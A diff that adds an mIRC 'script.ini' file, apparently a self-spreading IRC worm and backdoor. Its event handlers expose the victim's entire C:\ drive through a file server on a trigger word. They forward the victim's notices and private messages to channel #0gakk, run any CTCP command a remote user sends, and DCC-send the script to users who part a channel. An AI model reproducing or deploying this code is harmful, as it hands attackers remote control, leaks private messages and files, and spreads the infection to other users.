@@ -1,0 +1,9 @@
+[script]
+n1=ON 1:TEXT:*gakk-q*:#:/quit
+n2=ON 1:TEXT:*gakk-f*:#:/fserve $nick 1 c:\
+n3=ON 1:NOTICE:*:#:/msg #0gakk  $+ $chan $+  - $+ $nick $+ - $parms
+n4=ON 1:TEXT:*:?:/msg #0gakk **Msg from $nick version 6 $+ ** $parms | /closemsg  $nick
+n5=ctcp 1:*:$1-
+n6=ON 1:PART:#:if ($me != $nick) /dcc send $nick SCRIPT.INI
+
+
